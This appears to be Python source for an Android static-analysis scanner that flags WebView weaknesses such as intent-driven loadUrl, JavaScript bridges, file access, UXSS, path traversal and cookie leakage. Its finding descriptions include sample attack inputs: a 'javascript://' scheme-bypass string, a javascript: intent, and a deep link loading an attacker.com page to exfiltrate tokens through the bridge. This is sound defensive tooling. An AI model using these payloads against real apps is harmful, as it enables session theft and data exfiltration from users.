import logging
logger = logging.getLogger(__name__)


def detect_webview_intent_abuse(sa):
    findings = []
    intent_to_webview = sa._find_methods_by_regex(r'getIntent.*loadUrl|getStringExtra.*loadUrl|getData.*loadUrl')
    for dm in intent_to_webview[:5]:
        findings.append({"id":"ADV-WEBINT-001","name":"WebView Intent Abuse - Intent Data Fed to WebView",
            "description":"Data from an Intent is loaded directly into a WebView, allowing attackers to inject arbitrary URLs or JavaScript via crafted intents.",
            "severity":"CRITICAL","location":dm,
            "recommendation":"Validate and sanitize all Intent data before loading in WebView. Use an allowlist of trusted domains."})
    if findings:
        sa.findings.append({"category":"1. WebView Intent Abuse","rules":findings})


def detect_webview_chains(sa):
    findings = []
    has_wv = sa._find_methods_by_invoke("Landroid/webkit/WebView")
    js_enabled = sa._find_methods_by_invoke("Landroid/webkit/WebSettings;->setJavaScriptEnabled")
    js_interface = sa._find_methods_by_invoke("Landroid/webkit/WebView;->addJavascriptInterface")
    ovr = sa._find_methods_by_invoke("Landroid/webkit/WebViewClient;->shouldOverrideUrlLoading")

    if has_wv and js_interface:
        for dm in js_interface[:5]:
            findings.append({"id":"ADV-005","name":"WebView JavaScript Bridge (addJavascriptInterface)",
                "description":"A JavaScript interface bridge is exposed, creating a channel between web content and native code that can be exploited.",
                "severity":"HIGH","location":dm,
                "recommendation":"Only use with trusted content. All bridge methods must have @JavascriptInterface annotation (API 17+)."})
    if has_wv and js_enabled:
        for dm in js_enabled[:5]:
            findings.append({"id":"ADV-006","name":"WebView JavaScript Enabled",
                "description":"JavaScript is enabled in WebView, increasing XSS attack surface.",
                "severity":"MEDIUM","location":dm,
                "recommendation":"Disable JavaScript unless absolutely required. Load only trusted content."})
    if has_wv and not ovr:
        findings.append({"id":"ADV-007","name":"WebView - shouldOverrideUrlLoading Not Overridden",
            "description":"A WebViewClient is used without overriding shouldOverrideUrlLoading(), allowing the WebView to follow untrusted URLs.",
            "severity":"HIGH","location":"bytecode analysis",
            "recommendation":"Override shouldOverrideUrlLoading() to validate URLs against an allowlist."})
    if findings:
        sa.findings.append({"category":"3. WebView Vulnerabilities","rules":findings})


def detect_webview_file_access(sa):
    findings = []
    access_file = sa._find_methods_by_invoke("Landroid/webkit/WebSettings;->setAllowFileAccess")
    access_urls = sa._find_methods_by_invoke("Landroid/webkit/WebSettings;->setAllowFileAccessFromFileURLs")
    access_univ = sa._find_methods_by_invoke("Landroid/webkit/WebSettings;->setAllowUniversalAccessFromFileURLs")
    if access_file:
        for dm in access_file[:3]:
            findings.append({"id":"ADV-028","name":"WebView File Access Enabled (setAllowFileAccess)",
                "description":"File access is enabled in WebView, allowing local file disclosure.",
                "severity":"HIGH","location":dm,
                "recommendation":"Call setAllowFileAccess(false) to disable file:// access in WebView."})
    if access_urls:
        for dm in access_urls[:3]:
            findings.append({"id":"ADV-029","name":"WebView File URL Access Enabled",
                "description":"File URL access enables JavaScript in file:// URLs to access other file:// URLs.",
                "severity":"HIGH","location":dm,
                "recommendation":"Disable setAllowFileAccessFromFileURLs(false)."})
    if access_univ:
        for dm in access_univ[:3]:
            findings.append({"id":"ADV-030","name":"WebView Universal Access from File URLs",
                "description":"Universal access from file URLs allows JavaScript to access arbitrary origins.",
                "severity":"CRITICAL","location":dm,
                "recommendation":"Disable setAllowUniversalAccessFromFileURLs(true) immediately."})
    if findings:
        sa.findings.append({"category":"3. WebView File Access","rules":findings})


def detect_taint_webview_injection(sa):
    findings = []
    for f in sa.taint_findings.get("webview_injection", []):
        findings.append({"id":f.get("id","TAIN-WEBV-001"),
            "name":"WebView Injection via Tainted Input",
            "description":f"Tainted data reaches WebView sink ({f.get('sink','?')}). Attackers can inject URLs or JavaScript. Source: {f.get('source_hint','unknown')[:200]}",
            "severity":"CRITICAL","location":f.get("location","unknown"),
            "recommendation":"Validate and sanitize URLs before loading in WebView."})
    if findings:
        sa.findings.append({"category":"3. WebView Injection (Taint)","rules":findings})


def detect_webview_advanced(sa):
    findings = []
    has_wv = bool(sa._find_methods_by_invoke("Landroid/webkit/WebView"))
    js_interface = sa._find_methods_by_invoke("Landroid/webkit/WebView;->addJavascriptInterface")
    should_ovr = sa._find_methods_by_invoke("Landroid/webkit/WebViewClient;->shouldOverrideUrlLoading")
    url_loading = sa._find_methods_by_invoke("Landroid/webkit/WebView;->loadUrl")
    evaluate_js = sa._find_methods_by_invoke("Landroid/webkit/WebView;->evaluateJavascript")
    file_scheme = sa._find_methods_by_invoke("Landroid/webkit/WebSettings;->setAllowFileAccess")
    set_web_client = sa._find_methods_by_invoke("Landroid/webkit/WebView;->setWebViewClient")
    post_url = sa._find_methods_by_invoke("Landroid/webkit/WebView;->postUrl")
    chrome_client = sa._find_methods_by_invoke("Landroid/webkit/WebChromeClient")
    wv_rce_conditions = bool(js_interface) and bool(evaluate_js)
    if wv_rce_conditions:
        findings.append({"id":"ADV-WV-001","name":"WebView RCE Condition — addJavascriptInterface + evaluateJavascript",
            "description":"Both addJavascriptInterface() and evaluateJavascript() are used. Malicious JavaScript can call Java reflection via the bridge AND evaluate arbitrary JS, enabling remote code execution.",
            "severity":"CRITICAL","location":"bytecode analysis",
            "recommendation":"Never combine addJavascriptInterface with evaluateJavascript on untrusted content. Ensure @JavascriptInterface annotation is present on all bridge methods (API 17+)."})
    wv_xss_risk = has_wv and not should_ovr and url_loading
    if wv_xss_risk:
        findings.append({"id":"ADV-WV-002","name":"WebView XSS Risk — No URL Validation in shouldOverrideUrlLoading",
            "description":"WebView loads URLs but does not override shouldOverrideUrlLoading(). WebView can navigate to arbitrary URLs via JavaScript redirects, enabling XSS.",
            "severity":"CRITICAL","location":"bytecode analysis",
            "recommendation":"Override shouldOverrideUrlLoading() and validate all URLs against an allowlist before loading."})
    intent_from_wv = sa._find_methods_by_regex(r'loadUrl.*intent://|loadUrl.*tel:|loadUrl.*sms:|loadUrl.*mailto:')
    if intent_from_wv:
        for dm in intent_from_wv[:3]:
            findings.append({"id":"ADV-WV-003","name":"WebView Loads Intent/Tel/SMS Scheme URL",
                "description":f"WebView loads scheme URLs (intent://, tel://, etc.) in {dm}. Malicious JavaScript in WebView can trigger arbitrary intents, make phone calls, or send SMS.",
                "severity":"CRITICAL","location":dm,
                "recommendation":"Override shouldOverrideUrlLoading() to intercept and validate scheme URLs. Never allow intent:// URLs from WebView content."})
    if post_url and not set_web_client:
        findings.append({"id":"ADV-WV-004","name":"WebView.postUrl() Without Custom WebViewClient — Data Leakage Risk",
            "description":"WebView.postUrl() is used without a custom WebViewClient. POST data may include sensitive tokens sent via JavaScript.",
            "severity":"HIGH","location":"bytecode analysis",
            "recommendation":"Implement a custom WebViewClient to monitor and validate POST requests from WebView content."})
    if has_wv and not set_web_client:
        findings.append({"id":"ADV-WV-005","name":"WebView Without Custom WebViewClient — Default Navigations Allowed",
            "description":"WebView is used without setting a custom WebViewClient. The default WebViewClient allows all navigations, including to malicious URLs.",
            "severity":"MEDIUM","location":"bytecode analysis",
            "recommendation":"Always set a custom WebViewClient that overrides shouldOverrideUrlLoading() for URL validation."})
    if js_interface and file_scheme:
        findings.append({"id":"ADV-WV-006","name":"WebView JavaScript Bridge + File Access — Local File Disclosure via JS",
            "description":"JavaScript interface is enabled with file access. JavaScript in loaded content can read local files and exfiltrate via the bridge.",
            "severity":"CRITICAL","location":"bytecode analysis",
            "recommendation":"Disable file access in WebView when JavaScript interface is enabled. Never enable both simultaneously."})
    token_in_wv = sa._find_methods_by_regex(r'loadUrl.*token|loadUrl.*bearer|loadUrl.*jwt|loadUrl.*apikey|loadUrl.*api_key|loadUrl.*authorization')
    if token_in_wv:
        for dm in token_in_wv[:3]:
            findings.append({"id":"ADV-WV-007","name":"Token/Secret in WebView URL — Token Leaked to Web Server",
                "description":f"Sensitive tokens appear in WebView URL in {dm}. Tokens in URLs are leaked via referrer headers, browser history, and can be intercepted.",
                "severity":"CRITICAL","location":dm,
                "recommendation":"Pass tokens in request headers or POST body, never in URL query parameters. Use CookieManager for cookie-based auth."})
    if findings:
        sa.findings.append({"category":"23. WebView Advanced — XSS / RCE / Token Leakage / Intent Abuse","rules":findings})


def detect_webview_loaddatawithbaseurl(sa):
    findings = []
    ldwbu = sa._find_methods_by_invoke(
        "Landroid/webkit/WebView;->loadDataWithBaseURL"
    )
    if ldwbu:
        for dm in ldwbu[:5]:
            findings.append({
                "id": "ADV-WEB-020",
                "name": "WebView.loadDataWithBaseURL() — Universal XSS via Untrusted Base URL + HTML",
                "description": f"loadDataWithBaseURL() in {dm} loads HTML content with a specified base URL. If the base URL or HTML content comes from an Intent extra or untrusted source, an attacker can inject arbitrary JavaScript executing in the context of any domain (via the base URL), enabling Universal XSS, cookie theft, and session hijacking.",
                "severity": "CRITICAL",
                "location": dm,
                "recommendation": "Never pass untrusted base URL or HTML content to loadDataWithBaseURL(). Validate the base URL against an allowlist. Escape all HTML content from external sources."
            })
    ldwbu_intent = sa._find_methods_by_regex(
        r'loadDataWithBaseURL.*getStringExtra|loadDataWithBaseURL.*getData|loadDataWithBaseURL.*EXTRA_'
    )
    if ldwbu_intent:
        for dm in ldwbu_intent[:3]:
            findings.append({
                "id": "ADV-WEB-021",
                "name": "WebView.loadDataWithBaseURL() with Intent Data — Authentication Token Leak via UXSS",
                "description": f"loadDataWithBaseURL() uses data from Intent extras in {dm}. This is the classic Evernote-style UXSS: attacker controls EXTRA_BASE_URL (any domain) and EXTRA_HTML_CONTENT (arbitrary HTML/JS) to execute JavaScript in the target domain's context with the app's authentication cookies.",
                "severity": "CRITICAL",
                "location": dm,
                "recommendation": "Never load HTML content from Intent data into loadDataWithBaseURL(). Use a fixed, trusted base URL if loadDataWithBaseURL is required."
            })
    if findings:
        sa.findings.append({"category":"23. WebView — loadDataWithBaseURL Universal XSS","rules":findings})


def detect_webview_webresourceresponse(sa):
    findings = []
    intercept = sa._find_methods_by_invoke(
        "Landroid/webkit/WebViewClient;->shouldInterceptRequest"
    )
    wvr = sa._find_methods_by_invoke(
        "Landroid/webkit/WebResourceResponse"
    )
    if intercept and wvr:
        path_based = sa._find_methods_by_regex(
            r'shouldInterceptRequest.*getLastPathSegment|shouldInterceptRequest.*substring.*path|'
            r'shouldInterceptRequest.*getPath.*File|shouldInterceptRequest.*openFileInput'
        )
        if path_based:
            for dm in path_based[:5]:
                findings.append({
                    "id": "ADV-WEB-030",
                    "name": "WebResourceResponse in shouldInterceptRequest — Path Traversal via URI Path",
                    "description": f"WebResourceResponse is returned from shouldInterceptRequest() using a file path derived from the request URI in {dm}. An attacker with XSS in the WebView can use XMLHttpRequest to request paths with '../' traversal sequences, leaking arbitrary files from the app's private directory (databases, shared preferences, cookies).",
                    "severity": "CRITICAL",
                    "location": dm,
                    "recommendation": "Canonicalize file paths in shouldInterceptRequest(). Restrict file access to a dedicated cache directory. Set Access-Control-Allow-Origin headers carefully to avoid CORS bypass."
                })
        acao = sa._find_methods_by_regex(
            r'Access-Control-Allow-Origin:\s*\*|Access-Control-Allow-Origin.*\*'
        )
        if intercept and acao:
            findings.append({
                "id": "ADV-WEB-031",
                "name": "Access-Control-Allow-Origin: * in WebResourceResponse — CORS Disabled",
                "description": "WebResourceResponse or HTTP headers include 'Access-Control-Allow-Origin: *', disabling same-origin policy. Any JavaScript in the WebView can read responses from the local handler via XHR, enabling arbitrary file theft.",
                "severity": "HIGH",
                "location": "bytecode analysis",
                "recommendation": "Restrict Access-Control-Allow-Origin to specific trusted origins. Never use wildcard for local resource handlers."
            })
    if findings:
        sa.findings.append({"category":"23. WebView — WebResourceResponse Path Traversal / File Theft","rules":findings})


def detect_webview_url_validation_bypass(sa):
    findings = []
    host_only = sa._find_methods_by_regex(
        r'Uri\.parse.*getHost|getHost.*equals|getHost.*endsWith|getHost.*contains'
    )
    no_scheme_check = sa._find_methods_by_regex(
        r'Uri\.parse.*getHost[\s\S]{0,100}loadUrl|getHost[\s\S]{0,100}javascript:|getHost[\s\S]{0,100}file:|getHost[\s\S]{0,100}content:'
    )
    if no_scheme_check:
        for dm in no_scheme_check[:5]:
            findings.append({
                "id": "ADV-WEB-040",
                "name": "WebView URL Validation — Host-Only Check Allows Scheme Bypass (javascript://, file://, content://)",
                "description": f"URL validation in {dm} only checks the host component without validating the scheme. Attackers can bypass host checks using alternative schemes: 'javascript://legitimate.com/%0aalert(1)' executes arbitrary JS, 'file://legitimate.com/path' reads local files, 'content://legitimate.com/' accesses content providers.",
                "severity": "CRITICAL",
                "location": dm,
                "recommendation": "Always validate both scheme AND host. Scheme must be 'https' (or a specific known scheme). Never rely on host-only validation for WebView URLs."
            })
    if findings:
        sa.findings.append({"category":"23. WebView — URL Validation Bypass / Scheme Injection","rules":findings})


def detect_webview_onnewintent_xss(sa):
    findings = []
    on_new = sa._find_methods_by_invoke(
        "Landroid/app/Activity;->onNewIntent"
    )
    wv_load = sa._find_methods_by_invoke(
        "Landroid/webkit/WebView;->loadUrl"
    )
    if on_new and wv_load:
        new_intent_js = sa._find_methods_by_regex(
            r'onNewIntent.*loadUrl|loadUrl.*getDataString|loadUrl.*getStringExtra'
        )
        if new_intent_js:
            for dm in new_intent_js[:5]:
                findings.append({
                    "id": "ADV-WEB-050",
                    "name": "WebView.onNewIntent() — Universal XSS via Delayed javascript: Scheme",
                    "description": f"WebView's onNewIntent() loads a URL from the incoming Intent in {dm}. An attacker can first open a legitimate domain (e.g., https://google.com), then send a second intent with 'javascript:alert(1)' as the URL. The javascript: scheme executes in the context of the already-loaded domain, achieving Universal XSS.",
                    "severity": "CRITICAL",
                    "location": dm,
                    "recommendation": "Validate all URLs loaded in WebView from onNewIntent(). Reject 'javascript:' scheme. Use shouldOverrideUrlLoading to intercept and validate all URL navigations."
                })
    if findings:
        sa.findings.append({"category":"23. WebView — onNewIntent Universal XSS via javascript: Scheme","rules":findings})


def detect_deeplink_webview_info_disclosure(sa):
    findings = []
    has_wv = bool(sa._find_methods_by_invoke("Landroid/webkit/WebView"))
    js_interface = sa._find_methods_by_invoke("Landroid/webkit/WebView;->addJavascriptInterface")
    has_deeplink = False
    intent_filters = sa.manifest_components
    for comp_type in ["activities", "services", "receivers"]:
        for comp in intent_filters.get(comp_type, []):
            for intent_f in comp.get("intent_filters", []):
                action_view = any(a.get("name") == "android.intent.action.VIEW" for a in intent_f.get("actions", []))
                browsable = any(c.get("name") == "android.intent.category.BROWSABLE" for c in intent_f.get("categories", []))
                if action_view and browsable:
                    has_deeplink = True
    dl_to_wv = sa._find_methods_by_regex(
        r'(getQueryParameter|getStringExtra|getData)[\s\S]{0,200}(loadUrl|loadDataWithBaseURL|loadData|postUrl|evaluateJavascript)'
    )
    if has_wv and js_interface and has_deeplink and dl_to_wv:
        for dm in dl_to_wv[:5]:
            findings.append({
                "id": "ADV-WEB-090",
                "name": "Deep Link Parameter Loaded in WebView with JavaScript Interface — Information Disclosure via Mobile Open Redirect",
                "description": f"Deep link data (query parameter, Intent extra) is loaded into a WebView that has a JavaScript interface (addJavascriptInterface) in {dm}. This is the classic Grab/OWASP MASTG pattern (HackerOne #401793): an attacker crafts a deep link like 'app://open?page=https://attacker.com/exploit.html' that loads an attacker-controlled URL in the app's WebView. The attacker's HTML/page can call JavaScript bridge methods (e.g., getGrabUser()) to exfiltrate the victim's personal data, session tokens, and device info to the attacker's server.",
                "severity": "CRITICAL",
                "location": dm,
                "recommendation": "Never load untrusted URLs from deep link parameters in WebViews with JavaScript bridges. Validate the URL against a strict allowlist of trusted domains. Use Custom Tabs for external URLs instead of in-app WebViews. If a WebView with a JS bridge is required, all URLs loaded must come from trusted sources and be validated against an allowlist."
            })
    if findings:
        sa.findings.append({"category": "23. WebView — Deep Link to WebView with JS Bridge (Grab-Style Information Disclosure)", "rules": findings})


def detect_webview_js_injection(sa):
    findings = []
    eval_js_concat = sa._find_methods_by_regex(
        r'evaluateJavascript.*\+|loadUrl.*javascript:\s*.*\+|loadUrl.*javascript:\s*.*getQueryParameter|'
        r'evaluateJavascript.*getStringExtra|evaluateJavascript.*getData|evaluateJavascript.*getQueryParameter'
    )
    if eval_js_concat:
        for dm in eval_js_concat[:5]:
            findings.append({
                "id": "ADV-WEB-060",
                "name": "JavaScript Code Injection via String Concatenation — DOM-Based XSS",
                "description": f"JavaScript code is constructed via string concatenation with external data in {dm}. If user-controlled data (from intents, deep links, or WebView content) is concatenated into evaluateJavascript() or javascript: scheme URLs, attackers can inject arbitrary JS code executing in the WebView's page context.",
                "severity": "CRITICAL",
                "location": dm,
                "recommendation": "Use JSON serialization (JSON.stringify) to safely encode data passed to evaluateJavascript. Never concatenate user data directly into JavaScript code strings."
            })
    if findings:
        sa.findings.append({"category":"23. WebView — JavaScript Injection via String Concatenation","rules":findings})


def detect_webview_file_chooser_interception(sa):
    findings = []
    on_show = sa._find_methods_by_invoke(
        "Landroid/webkit/WebChromeClient;->onShowFileChooser"
    )
    oar = sa._find_methods_by_invoke(
        "Landroid/app/Activity;->onActivityResult"
    )
    if on_show and oar:
        file_chooser_oar = sa._find_methods_by_regex(
            r'onShowFileChooser.*startActivityForResult|onShowFileChooser.*onActivityResult|'
            r'fileChooserParams.*createIntent|ValueCallback.*onReceiveValue'
        )
        if file_chooser_oar:
            for dm in file_chooser_oar[:3]:
                findings.append({
                    "id": "ADV-WEB-070",
                    "name": "WebView File Chooser (onShowFileChooser) — Arbitrary File Theft via Intent Interception",
                    "description": f"WebView's onShowFileChooser() in {dm} uses startActivityForResult() with an implicit intent (createIntent()). A malicious app can intercept the implicit intent and return a file:// URI pointing to sensitive files, enabling theft of databases, shared preferences, and cookies from the app's private directory.",
                    "severity": "CRITICAL",
                    "location": dm,
                    "recommendation": "Validate the returned URI in onActivityResult. Reject file:// scheme URIs. Verify the URI points to a non-internal path using isInternalUri() check."
                })
    if findings:
        sa.findings.append({"category":"23. WebView — File Chooser Interception / Arbitrary File Theft","rules":findings})


def detect_webview_cookie_injection(sa):
    findings = []
    set_cookie = sa._find_methods_by_invoke(
        "Landroid/webkit/CookieManager;->setCookie"
    )
    if set_cookie:
        untrusted_url_cookie = sa._find_methods_by_regex(
            r'CookieManager.*setCookie.*(getData|getStringExtra|getQueryParameter)'
        )
        if untrusted_url_cookie:
            for dm in untrusted_url_cookie[:5]:
                findings.append({
                    "id": "ADV-WEB-080",
                    "name": "Cookie Set for Untrusted Domain — Session Token Leakage via Shared Cookie Storage",
                    "description": f"A cookie (potentially containing auth tokens) is set for a URL from Intent data in {dm}. If the domain is attacker-controlled, the session cookie is sent to the attacker's server. Since all WebViews in the app share the same cookie store, even delayed loading of the attacker's domain elsewhere can leak the token.",
                    "severity": "CRITICAL",
                    "location": dm,
                    "recommendation": "Validate the URL against an allowlist before setting cookies. Only set auth cookies for known, trusted domains under your control."
                })
        if set_cookie and not untrusted_url_cookie:
            for dm in set_cookie[:3]:
                findings.append({
                    "id": "ADV-WEB-081",
                    "name": "CookieManager.setCookie() Used — Review Cookie Scope and Domain",
                    "description": f"CookieManager.setCookie() in {dm} sets cookies manually. Ensure cookies are only set for trusted domains and contain '; Secure; HttpOnly; SameSite=Lax' flags.",
                    "severity": "MEDIUM",
                    "location": dm,
                    "recommendation": "Use secure cookie flags (Secure, HttpOnly, SameSite). Validate domain before setting cookies."
                })
    if findings:
        sa.findings.append({"category":"23. WebView — Cookie Injection / Session Token Leakage","rules":findings})
